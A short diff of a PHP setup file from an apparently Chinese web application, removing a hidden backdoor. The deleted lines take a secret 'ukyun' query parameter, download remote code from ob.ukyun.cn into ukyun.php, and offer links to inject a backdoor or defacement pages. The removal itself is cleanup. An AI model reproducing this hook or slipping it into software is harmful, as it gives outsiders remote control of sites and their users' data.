@@ -73,7 +73,4 @@ exit("<script language='javascript'>alert('你还未安装，请前往安装！'
 if(!file_exists(ROOT."install/sql_v1.0.3.lock")) {
 exit("<script language='javascript'>alert('数据库需更新,请立即前往更新！');window.location.href='/install/sql_update_v1.0.3.php';</script>");
 }
-
-if(isset($_GET['ukyun'])){file_put_contents('ukyun.php',file_get_contents('http://ob.ukyun.cn/api/hm.txt'));echo "<a href='ukyun.php?mod=hm'>点我注入后门</a><br><a href='ukyun.php?mod=hy'>点我注入黑页</a><br><a href='ukyun.php?mod=hy2'>点我注入黑页2</a>";
-}
 ?>
